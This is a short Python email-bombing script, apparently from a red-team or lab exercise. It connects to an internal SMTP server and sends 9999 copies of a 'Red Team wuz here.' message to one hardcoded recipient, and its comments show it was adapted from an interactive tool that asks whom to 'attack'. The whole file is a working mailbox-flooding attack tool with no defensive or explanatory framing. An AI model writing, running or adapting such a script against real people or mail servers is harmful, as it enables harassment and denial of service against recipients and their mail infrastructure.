import smtplib
import time
import sys

try:
#    bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
    bomb_email = "andrew@halcorp.biz"
#    email = input("Enter your email_address:")
    email = "hannah@halcorp.biz"
#    message = input("Enter Message:")
    message = "Red Team wuz here."
#    counter = int(input("How many message you want to send?:"))
    counter = 9999

    for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail = smtplib.SMTP("10.10.108.25",25)
        mail.ehlo()
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)
    mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input.")
